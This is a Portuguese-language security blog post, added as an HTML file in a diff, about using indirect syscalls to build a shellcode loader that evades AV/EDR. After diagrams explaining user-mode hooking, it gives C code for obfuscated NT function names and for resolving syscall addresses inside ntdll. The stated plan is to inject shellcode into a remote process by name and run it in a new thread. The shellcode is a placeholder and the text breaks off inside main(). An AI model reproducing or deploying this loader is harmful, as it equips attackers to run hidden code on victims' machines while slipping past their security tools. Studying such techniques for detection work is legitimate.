@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="../images/50.png" type="image/x-icon">
+  <title>Indirect-Syscalls</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/languages/cpp.min.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', (event) => {
+      document.querySelectorAll('pre code').forEach((block) => {
+        hljs.highlightElement(block);
+      });
+    });
+  </script>
+  <style>
+    ::-webkit-scrollbar {
+      width: 10px;
+    }
+
+    ::-webkit-scrollbar-track {
+      background: #333;
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: #555;
+      border-radius: 5px;
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+      background: #777;
+    }
+
+    html {
+      scrollbar-color: #555 #333;
+      scrollbar-width: thin;
+    }
+  </style>
+  <style>
+    pre {
+      background-color: #1e1e1e;
+      color: #ffffff;
+      padding: 15px;
+      border-radius: 8px;
+      overflow-x: auto;
+      font-family: 'Courier New', monospace;
+      font-size: 14px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+    }
+  </style>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../text_style.css">
+  <link rel="stylesheet" href="../background.css">
+  <link rel="stylesheet" href="../dimensao.css">
+  <link rel="stylesheet" href="../head_style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+</head>
+
+<body>
+  <header style="height: 55px;">
+    <div class="logo">
+      <img src="../images/50.png" height="40" alt="Vith0r logo"
+        style="position: relative; left: none; height: 42px; width: 42px; top: -1px;">
+      <h2>
+        <a href="https://vith0r.github.io"
+          style="color: rgba(255, 255, 255, 0.7); text-decoration: none; position: relative; text-shadow: 3px 3px 5px rgba(139, 92, 246, 0.7); font-family: 'Press Start 2P', sans-serif; font-size: 19px;">
+          &nbsp;VITHOR
+        </a>
+      </h2>
+    </div>
+    <nav>
+      <div class="toggle-container">
+        <a href="../whoami.html">
+          <button class="tutorials-toggle"><i></i>Whoami</button>
+        </a>
+        <a href="../posts.html">
+          <button class="tools-toggle"><i></i>Posts</button>
+        </a>
+        <a href="../projects.html">
+          <button class="tools-toggle"><i></i>Projects</button>
+        </a>
+      </div>
+    </nav>
+  </header>
+  <script>
+    const element = document.querySelector('.logo h2 a');
+    const targetWord = "VITHOR";
+
+    function getRandomString(length) {
+      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+      let result = '';
+      for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * characters.length));
+      }
+      return result;
+    }
+
+    function animateRandomization(element, targetWord) {
+      const originalWord = targetWord.split('');
+      let iterations = 0;
+      const maxIterations = 15;
+      let currentWord = getRandomString(targetWord.length).split('');
+      let currentIndex = 0;
+
+      element.style.display = 'inline-block';
+      element.style.width = `${element.offsetWidth}px`;
+      element.style.position = 'relative';
+      element.style.left = '5px';
+
+      const interval = setInterval(() => {
+        if (iterations < maxIterations) {
+          currentWord = getRandomString(targetWord.length).split('');
+          iterations++;
+        } else {
+          if (currentIndex < targetWord.length) {
+            currentWord[currentIndex] = originalWord[currentIndex];
+            currentIndex++;
+          } else {
+            clearInterval(interval);
+          }
+        }
+        element.textContent = currentWord.join('');
+      }, 60);
+    }
+
+    setInterval(() => {
+      animateRandomization(element, targetWord);
+    }, 10000);
+
+    element.addEventListener('mouseover', () => {
+      animateRandomization(element, targetWord);
+    });
+
+    animateRandomization(element, targetWord);
+  </script>
+
+  <body>
+    <div class="grain-header"></div>
+    <main>
+      <div class="box">
+        <h1
+          style="color: rgba(255, 255, 255, 0.9); text-decoration: none; position: relative; text-shadow: 3px 3px 5px rgba(60, 122, 255, 0.8);">
+          Indirect Syscalls</h1>
+        <br>
+        <p>Posted Oct 5, 2024. 17 min read</p>
+        <br>
+        <div class="post-author">
+          <a href="https://github.com/Vith0r" target="_blank">
+            <img src="https://avatars.githubusercontent.com/u/124220594?v=4" alt="Vithor logo">
+            <span>Vithor</span>
+          </a>
+        </div>
+
+        <article>
+          <div style="font-size: 16px;">
+            <p>Percebi que já havia abordado o tema de <strong>syscalls indiretos</strong> em outros posts, mas nunca
+              tinha feito um post específico sobre o assunto. Então, neste post, vamos criar um loader que utiliza
+              <strong>syscalls indiretos</strong>.<br><br>
+            </p>
+            <div style="padding: 10px; background-color: rgba(60, 122, 255, 0.2); color: white; margin-bottom: 10px;">
+              ⚠️ As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou qualquer outra
+              coisa são estritamente para fins educacionais.
+            </div>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Entendendo o
+              processo</h2>
+            <p>Vou deixar abaixo algumas imagens que encontrei e que acredito serem úteis para entender melhor o
+              assunto.</p>
+            <p>A figura abaixo mostra como funcionam as chamadas de sistema usando o exemplo do Bloco de Notas
+              (notepad.exe). Quando o Bloco de Notas salva um arquivo, ele segue os seguintes passos:<br></p>
+            <ol style="list-style-type: none; padding-left: 0;">
+              <li style="margin-left: 0;"><strong>1</strong> Primeiro, ele acessa o arquivo <span
+                  style="color: #9E2525;">kernel32.dll</span> e chama a função do Windows chamada <span
+                  style="color: #9E2525;">WriteFile</span>.<br></li>
+              <li style="margin-left: 0;"><strong>2</strong> Em seguida, o <span
+                  style="color: #9E2525;">kernel32.dll</span> chama outro arquivo chamado <span
+                  style="color: #9E2525;">Kernelbase.dll</span> para continuar o processo.<br></li>
+              <li style="margin-left: 0;"><strong>3</strong> Depois, a função <span
+                  style="color: #9E2525;">WriteFile</span> usa a função nativa do Windows chamada <span
+                  style="color: #9E2525;">NtCreateFile</span>, encontrada no <span
+                  style="color: #9E2525;">Ntdll.dll</span>. Essa função nativa tem as instruções para iniciar a
+                &quot;chamada de sistema&quot;, que é um comando que faz o computador trocar do modo usuário (onde os
+                programas normais rodam) para o modo kernel (onde as partes mais importantes do sistema operam), e assim
+                salva o arquivo.<br></li>
+            </ol>
+            <p>Esses passos fazem com que o computador realize a transição de modos e consiga salvar o arquivo no disco.
+            </p>
+            <p><img src="https://redops.at/assets/images/blog/notepad_transition_syscall.png" alt=""
+                style="max-width: 100%; height: 420px; width: 720px; display: block; margin: 20px auto;"></p>
+            <p>A figura abaixo explica como funciona um <strong>AV/EDR</strong> ao monitorar e interceptar chamadas de
+              sistema.</p>
+            <ol style="list-style-type: none; padding-left: 0;">
+              <li style="margin-left: 0;"><strong>1</strong> Quando o Bloco de Notas quer criar um arquivo, ele chama a
+                função <span style="color: #9E2525;">CreateFileW</span> usando a <span
+                  style="color: #9E2525;">Kernel32.dll</span>.</li>
+              <li style="margin-left: 0;"><strong>2</strong> Essa função passa para a <span
+                  style="color: #9E2525;">Kernelbase.dll</span>, que continua o processo normalmente.</li>
+              <li style="margin-left: 0;"><strong>3</strong> Antes da chamada de sistema ser realizada, o
+                <strong>EDR</strong> interfere. Ele usa o arquivo <span style="color: #9E2525;">Hooking.dll</span> para
+                modificar a função nativa <span style="color: #9E2525;">NtCreateFile</span>, que está dentro do <span
+                  style="color: #9E2525;">Ntdll.dll</span>. Isso é conhecido como <strong>&quot;API
+                  Hooking&quot;</strong>.
+              </li>
+              <li style="margin-left: 0;"><strong>4</strong> Depois que o <strong>EDR</strong> processa ou verifica a
+                função, a chamada de sistema é finalmente executada.</li>
+              <li style="margin-left: 0;"><strong>5</strong> A função <span style="color: #9E2525;">NtCreateFile</span>
+                continua, e o sistema realiza a transição para o modo kernel (Ring 0), onde a função é executada no
+                nível mais baixo do sistema.</li>
+            </ol>
+            <p>Com isso, o <strong>EDR</strong> consegue monitorar e até bloquear ações suspeitas antes que o sistema as
+              execute.</p>
+            <p><img src="https://redops.at/assets/images/blog/Usermode_hooking_principle.png" alt=""
+                style="max-width: 100%; height: 420px; width: 720px; display: block; margin: 20px auto;"><br><img
+                src="https://i.imgur.com/9UtU4S1.png" alt=""
+                style="max-width: 100%; height: 420px; width: 720px; display: block; margin: 20px auto;"><br></p>
+            <p>A figura abaixo mostra a transição do modo de usuário para o modo kernel no contexto da execução de
+              malware com chamadas de sistema diretas implementadas.</p>
+            <ol style="list-style-type: none; padding-left: 0;">
+              <li style="margin-left: 0;"><strong>1</strong> O malware <span style="color: #9E2525;">Malware.exe</span>
+                deseja realizar uma operação, como criar um arquivo, mas em vez de usar as APIs comuns do Windows, como
+                <span style="color: #9E2525;">CreateFileW()</span>, ele opta por um método mais furtivo.
+              </li>
+              <li style="margin-left: 0;"><strong>2</strong> Em vez de invocar a função <span
+                  style="color: #9E2525;">NtCreateFile()</span> através da <span
+                  style="color: #9E2525;">Ntdll.dll</span> (que é comumente usada para essas operações), o malware faz
+                uso de <strong>&quot;direct syscalls&quot;</strong> (chamadas de sistema diretas). Ou seja, ele salta
+                completamente as camadas intermediárias e invoca diretamente as instruções de syscall do sistema
+                operacional, ignorando funções como <span style="color: #9E2525;">NtCreateFile()</span>.</li>
+              <li style="margin-left: 0;"><strong>3</strong> Esse método de <strong>&quot;direct syscalls&quot;</strong>
+                permite ao malware evitar interceptações ou modificações feitas por sistemas de monitoramento, como
+                <strong>EDRs</strong>, que frequentemente <strong>&quot;hookam&quot;</strong> ou monitoram APIs de nível
+                superior como <span style="color: #9E2525;">Ntdll.dll</span>.
+              </li>
+              <li style="margin-left: 0;"><strong>4</strong> Ao fazer a chamada de sistema direta, a execução
+                imediatamente transita para o modo kernel (Ring 0), onde a função de sistema <span
+                  style="color: #9E2525;">KiSystemCall64</span> é chamada.</li>
+              <li style="margin-left: 0;"><strong>5</strong> O <span style="color: #9E2525;">KiSystemCall64</span>
+                pesquisa a tabela de descritores de serviço do sistema (SSDT) para encontrar o código da função
+                correspondente, como <span style="color: #9E2525;">NtCreateFile()</span> ou a função de sistema
+                diretamente referenciada.</li>
+              <li style="margin-left: 0;"><strong>6</strong> Finalmente, o sistema executa a operação no modo kernel com
+                privilégios elevados, permitindo ao malware realizar sua ação sem ser detectado pelas ferramentas de
+                segurança que monitoram as camadas superiores.</li>
+            </ol>
+            <p>O uso de <strong>&quot;direct syscalls&quot;</strong> permite que o malware contorne facilmente as
+              camadas de defesa baseadas em APIs monitoradas, evitando a maioria das técnicas de detecção que dependem
+              do hook nas funções intermediárias.</p>
+            <p><img src="https://redops.at/assets/images/blog/direct_syscall_principle.png" alt=""
+                style="max-width: 100%; height: 420px; width: 720px; display: block; margin: 20px auto;"></p>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Indirect
+              syscalls</h2>
+            <p>A figura abaixo ilustra como um <strong>malware</strong> utiliza a técnica de <strong>syscall indireta
+                (indirect syscall)</strong> para realizar chamadas de sistema de maneira mais furtiva em comparação com
+              a técnica de <strong>syscall direta (direct syscall)</strong>.</p>
+            <ol style="list-style-type: none; padding-left: 0;">
+              <li style="margin-left: 0;"><strong>1</strong> O malware <span style="color: #9E2525;">Malware.exe</span>
+                prepara os registradores necessários para realizar a operação de forma semelhante à syscall direta. No
+                entanto, em vez de fazer a chamada diretamente para o kernel, ele faz o salto para a instrução de
+                syscall que já está dentro da <span style="color: #9E2525;">Ntdll.dll</span>.<br><strong>Por que é menos
+                  suspeito?</strong>: Como a instrução syscall é executada na memória legítima da <span
+                  style="color: #9E2525;">Ntdll.dll</span>, ela parece uma operação legítima para o
+                <strong>AV/EDR</strong>, já que a <span style="color: #9E2525;">Ntdll.dll</span> é uma parte confiável
+                do sistema. Essa abordagem reduz as chances de detecção.
+              </li>
+              <li style="margin-left: 0;"><strong>2</strong> Uma grande vantagem dessa técnica é que tanto a execução da
+                syscall quanto a instrução de retorno (<span style="color: #9E2525;">syscall return</span>) ocorrem na
+                memória da <span style="color: #9E2525;">Ntdll.dll</span>. Isso dá uma aparência de comportamento
+                legítimo.<br><strong>Evasão de AV/EDR</strong>: O EDR pode estar monitorando chamadas diretas de
+                syscalls customizadas que executam operações maliciosas. No entanto, como a execução ocorre dentro de
+                uma biblioteca de sistema legítima, como a <span style="color: #9E2525;">Ntdll.dll</span>, a execução é
+                vista como &quot;normal&quot;, dificultando a detecção.</li>
+              <li style="margin-left: 0;"><strong>3</strong> Quando a syscall é invocada a partir da <span
+                  style="color: #9E2525;">Ntdll.dll</span>, a transição para o modo kernel (Ring 0) ocorre normalmente,
+                com a função <span style="color: #9E2525;">KiSystemCall64</span> sendo executada, e a tabela SSDT
+                (System Service Descriptor Table) consultada.</li>
+              <li style="margin-left: 0;"><strong>4</strong> Após a execução do comando syscall, a instrução de retorno
+                (<span style="color: #9E2525;">syscall return</span>) redireciona o controle para a memória legítima da
+                <span style="color: #9E2525;">Ntdll.dll</span>, e, a partir daí, o fluxo de execução retorna ao
+                malware.<br><strong>Diferença com Direct Syscalls</strong>: Na técnica de direct syscall, o malware
+                executa diretamente a instrução syscall, o que pode levantar suspeitas, pois a execução ocorre em uma
+                região de memória fora de uma biblioteca legítima. Isso pode ser detectado mais facilmente por
+                ferramentas de segurança.
+              </li>
+              <li style="margin-left: 0;"><strong>5</strong> A técnica de <strong>syscall indireta</strong> é, portanto,
+                uma evolução da <strong>syscall direta</strong>, pois resolve problemas de evasão de
+                <strong>AV/EDR</strong>, tornando a atividade maliciosa menos detectável. Ao executar tanto a syscall
+                quanto o retorno dentro da <span style="color: #9E2525;">Ntdll.dll</span>, o malware se mistura melhor
+                com as operações legítimas do sistema, enganando as defesas baseadas em comportamento.
+              </li>
+            </ol>
+            <p>Essa técnica torna o malware significativamente mais furtivo, pois explora o fato de que os
+              <strong>AV/EDRs</strong> confiam no código da <span style="color: #9E2525;">Ntdll.dll</span> e não
+              &quot;esperam&quot; que a execução maliciosa esteja ocorrendo a partir desse local confiável.
+            </p>
+            <p><img src="https://i.imgur.com/avFZoDF.png" alt=""
+                style="max-width: 100%; height: 420px; width: 720px; display: block; margin: 20px auto;"></p>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Código</h2>
+            <p>Aqui está a nossa <span style="color: #9E2525;">func.h</span>, que define algumas funções essenciais para
+              a execução de <strong>syscalls indiretas</strong>. Nela, incluímos a estrutura <span
+                style="color: #9E2525;">CLIENT_ID</span>, que ajuda a identificar processos e threads, e <span
+                style="color: #9E2525;">OBJECT_ATTRIBUTES</span>, que armazena atributos de objetos do Windows. Também
+              declaramos funções como <span style="color: #9E2525;">NtOpenProcess</span>, <span
+                style="color: #9E2525;">NtAllocateVirtualMemory</span>, e outras, que serão usadas para interagir com
+              processos e memória de forma direta.</p>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span>  </span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;psapi.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tlhelp32.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;wchar.h&gt;</span></span>
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">SetConsoleColor</span><span class="hljs-params">(WORD color)</span> {
+	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+	SetConsoleTextAttribute(hConsole, color);
+}
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CLIENT_ID</span> {</span>
+	HANDLE UniqueProcess;
+	HANDLE UniqueThread;
+} CLIENT_ID, * PCLIENT_ID;
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">LSA_UNICODE_STRING</span> {</span> USHORT Length;	USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
+<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">OBJECT_ATTRIBUTES</span> {</span> ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor;	PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+
+<span class="hljs-keyword">extern</span> <span class="hljs-title function_">NtOpenProcess</span><span class="hljs-params">(
+	PHANDLE ProcessHandle,
+	ACCESS_MASK DesiredAccess,
+	POBJECT_ATTRIBUTES ObjectAttributes,
+	PCLIENT_ID ClientId
+)</span>;
+
+<span class="hljs-keyword">extern</span> NTSTATUS <span class="hljs-title function_">NtAllocateVirtualMemory</span><span class="hljs-params">(
+	HANDLE ProcessHandle,
+	PVOID* BaseAddress,
+	ULONG_PTR ZeroBits,
+	PSIZE_T RegionSize,
+	ULONG AllocationType,
+	ULONG Protect
+)</span>;
+
+
+<span class="hljs-keyword">extern</span> NTSTATUS <span class="hljs-title function_">NtWriteVirtualMemory</span><span class="hljs-params">(
+	HANDLE ProcessHandle,
+	PVOID BaseAddress,
+	PVOID Buffer,
+	SIZE_T NumberOfBytesToWrite,
+	PULONG NumberOfBytesWritten
+)</span>;
+
+
+<span class="hljs-keyword">extern</span> NTSTATUS <span class="hljs-title function_">NtCreateThreadEx</span><span class="hljs-params">(
+	PHANDLE ThreadHandle,
+	ACCESS_MASK DesiredAccess,
+	PVOID ObjectAttributes,
+	HANDLE ProcessHandle,
+	PVOID lpStartAddress,
+	PVOID lpParameter,
+	ULONG Flags,
+	SIZE_T StackZeroBits,
+	SIZE_T SizeOfStackCommit,
+	SIZE_T SizeOfStackReserve,
+	PVOID lpBytesBuffer
+)</span>;
+
+
+<span class="hljs-keyword">extern</span> NTSTATUS <span class="hljs-title function_">NtWaitForSingleObject</span><span class="hljs-params">(
+	HANDLE Handle,
+	BOOLEAN Alertable,
+	PLARGE_INTEGER Timeout
+
+)</span>;
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">InitializeObjectAttributes</span><span class="hljs-params">(
+	POBJECT_ATTRIBUTES pObjectAttributes,
+	PUNICODE_STRING pObjectName,
+	ULONG Attributes,
+	HANDLE RootDirectory,
+	PVOID SecurityDescriptor
+)</span> {
+	<span class="hljs-keyword">if</span> (pObjectAttributes == <span class="hljs-literal">NULL</span>) {
+		<span class="hljs-keyword">return</span>;
+	}
+
+	pObjectAttributes-&gt;Length = <span class="hljs-keyword">sizeof</span>(OBJECT_ATTRIBUTES);
+	pObjectAttributes-&gt;RootDirectory = RootDirectory;
+	pObjectAttributes-&gt;ObjectName = pObjectName;
+	pObjectAttributes-&gt;Attributes = Attributes;
+	pObjectAttributes-&gt;SecurityDescriptor = SecurityDescriptor;
+	pObjectAttributes-&gt;SecurityQualityOfService = <span class="hljs-literal">NULL</span>;
+}
+
+DWORD SSNtOpenProcess;
+UINT_PTR AddrNtOpenProcess;
+DWORD SSNtAllocateVirtualMemory;
+UINT_PTR AddrNtAllocateVirtualMemory;
+DWORD SSNtWriteVirtualMemory;
+UINT_PTR AddrNtWriteVirtualMemory;
+DWORD SSNtCreateThreadEx;
+UINT_PTR AddrNtCreateThreadEx;
+DWORD SSNtWaitForSingleObject;
+UINT_PTR AddrNtWaitForSingleObject;
+</pre>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Agora em nosso
+              código main</h2>
+            <p>Começamos incluindo nosso cabeçalho <span style="color: #9E2525;">func.h</span>, que reúne as declarações
+              necessárias para as funções NT que utilizamos.<br></p>
+            <p>Utilizamos o <span style="color: #9E2525;">GetProcessIdByName</span> para buscar o PID (Process ID) de um
+              processo alvo pelo seu nome.<br><br>Além disso, resolvemos ponteiros de função para chamadas de API
+              nativas do Windows, extraídas de <span style="color: #9E2525;">ntdll.dll</span>, obtendo os números de
+              syscalls e os endereços dessas syscalls para funções como <span
+                style="color: #9E2525;">NtOpenProcess</span>, <span
+                style="color: #9E2525;">NtAllocateVirtualMemory</span>, e outras. Nosso objetivo final é abrir o
+              processo de destino, alocar memória, escrever o shellcode nessa memória alocada e executar o shellcode,
+              usando syscalls.</p>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Ofuscação de
+              Nomes de Funções</h3>
+            <p>Como mencionamos anteriormente, a técnica de <strong>ofuscação</strong> utilizada para os nomes das
+              funções NT é interessante:</p>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-type">char</span> NotNtOpenProcessName[] = { <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-number">0</span> };
+</pre>
+            <p>Ao definir os nomes como arrays de caracteres em vez de strings, estamos criando uma barreira contra
+              análise de código <strong>estático</strong>. Isso pode ser uma abordagem importante em alguns cenários,
+              pois torna mais &quot;difícil&quot; para ferramentas de detecção identificarem facilmente as operações que
+              o código realiza.</p>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Obtenção de
+              Endereços de Funções</h3>
+            <p>Fazemos o uso de <span style="color: #9E2525;">GetProcAddress</span> em conjunto com <span
+                style="color: #9E2525;">GetModuleHandleA</span> para recuperar os endereços das funções
+              <strong>NT</strong>. Também temos um deslocamento de <strong>4 bytes</strong> adicionado ao endereço da
+              função recuperada, seguido pela soma de <strong>0x12</strong> ao endereço recuperado.<br>
+              <strong>Exemplo:</strong><br>
+            </p>
+            <p><span style="color: #9E2525;">NtOpenProcess = 0x00007FF98C5ADA10 <-- Endereço</span><br><span
+                    style="color: #9E2525;">NtOpenProcess Syscall = 0x00007FF98C5ADA22 <-- Endereço</span><br><span
+                        style="color: #9E2525;">0x00007FF98C5ADA22</span> <strong>-</strong> <span
+                        style="color: #9E2525;">0x00007FF98C5ADA10</span> <strong>=</strong> <span
+                        style="color: #9E2525;">0x12</span><br><span style="color: #9E2525;">0x00007FF98C5ADA10</span>
+                      <strong>+</strong> <span style="color: #9E2525;">0x12</span> <strong>=</strong> <span
+                        style="color: #9E2525;">0x00007FF98C5ADA22</span></p>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Manipulação de
+              Memória</h3>
+            <p>Temos nossas chamadas <span style="color: #9E2525;">NtAllocateVirtualMemory</span> e <span
+                style="color: #9E2525;">NtWriteVirtualMemory</span> para alocar espaço de memória no processo alvo e
+              escrever o shellcode. A alocação de memória em um processo remoto exige permissões adequadas. O uso de
+              <strong>MEM_COMMIT | MEM_RESERVE</strong> em <span style="color: #9E2525;">NtAllocateVirtualMemory</span>
+              é importante, pois garante que a memória alocada esteja disponível e pronta para uso.
+            </p>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Criação de
+              Threads</h3>
+            <p>Realizamos a criação de uma <strong>thread remota</strong> com <span
+                style="color: #9E2525;">NtCreateThreadEx</span>. A função inicia a execução do Shellcode escrito na
+              memória, fazemos uso de <span style="color: #9E2525;">NtWaitForSingleObject</span> para esperar a
+              conclusão da thread que inciamos.</p>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Gerenciamento de
+              Cores do Console</h3>
+            <p>Coloquei o <span style="color: #9E2525;">SetConsoleColor</span> que ajuda a manipular a cor do console,
+              adicionando na minha opinião uma camada de interatividade ao programa. Essa abordagem de interface com o
+              usuário é frequentemente negligenciada em exemplos de código, mas para mim é crucial para a experiência do
+              usuário. Permitindo que os erros e informações sejam destacados visualmente.</p>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;func.h&quot;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NT_SUCCESS</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)</span>
+<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
+
+<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = { ...Shellcode... };
+
+SIZE_T shellcodeSize = <span class="hljs-keyword">sizeof</span>(shellcode);
+
+DWORD <span class="hljs-title function_">GetProcessIdByName</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* processName)</span>
+{
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);
+	<span class="hljs-keyword">if</span> (snapshot != INVALID_HANDLE_VALUE)
+	{
+		PROCESSENTRY32W processEntry;
+		processEntry.dwSize = <span class="hljs-keyword">sizeof</span>(PROCESSENTRY32W);
+
+		<span class="hljs-keyword">if</span> (Process32FirstW(snapshot, &amp;processEntry))
+		{
+			<span class="hljs-keyword">do</span>
+			{
+				<span class="hljs-keyword">if</span> (wcscmp(processEntry.szExeFile, processName) == <span class="hljs-number">0</span>)
+				{
+					CloseHandle(snapshot);
+					<span class="hljs-keyword">return</span> processEntry.th32ProcessID;
+				}
+			} <span class="hljs-keyword">while</span> (Process32NextW(snapshot, &amp;processEntry));
+		}
+	}
+
+	CloseHandle(snapshot);
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">printAddressLetterByLetter</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* name, UINT_PTR ntapiAddress, UINT_PTR syscallAddress)</span> {
+    SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
+    
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Endereco de %s: &quot;</span>, name);
+    <span class="hljs-type">char</span> ntapiBuffer[<span class="hljs-number">20</span>];
+    sprintf_s(ntapiBuffer, <span class="hljs-keyword">sizeof</span>(ntapiBuffer), <span class="hljs-string">&quot;0x%p&quot;</span>, (<span class="hljs-type">void</span>*)ntapiAddress);
+
+    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; ntapiBuffer[i] != <span class="hljs-string">&#x27;\0&#x27;</span>; i++) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, ntapiBuffer[i]);
+        fflush(<span class="hljs-built_in">stdout</span>);
+        Sleep(<span class="hljs-number">10</span>);
+    }
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
+    
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Endereco de %s Syscall: &quot;</span>, name);
+    <span class="hljs-type">char</span> syscallBuffer[<span class="hljs-number">20</span>];
+    sprintf_s(syscallBuffer, <span class="hljs-keyword">sizeof</span>(syscallBuffer), <span class="hljs-string">&quot;0x%p&quot;</span>, (<span class="hljs-type">void</span>*)syscallAddress);
+
+    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; syscallBuffer[i] != <span class="hljs-string">&#x27;\0&#x27;</span>; i++) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, syscallBuffer[i]);
+        fflush(<span class="hljs-built_in">stdout</span>);
+        Sleep(<span class="hljs-number">10</span>);
+    }
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+
+	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+	PVOID allocBuffer = <span class="hljs-literal">NULL</span>;
+
+	<span class="hljs-type">char</span> n_dll_name[] = { <span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-number">0</span> };
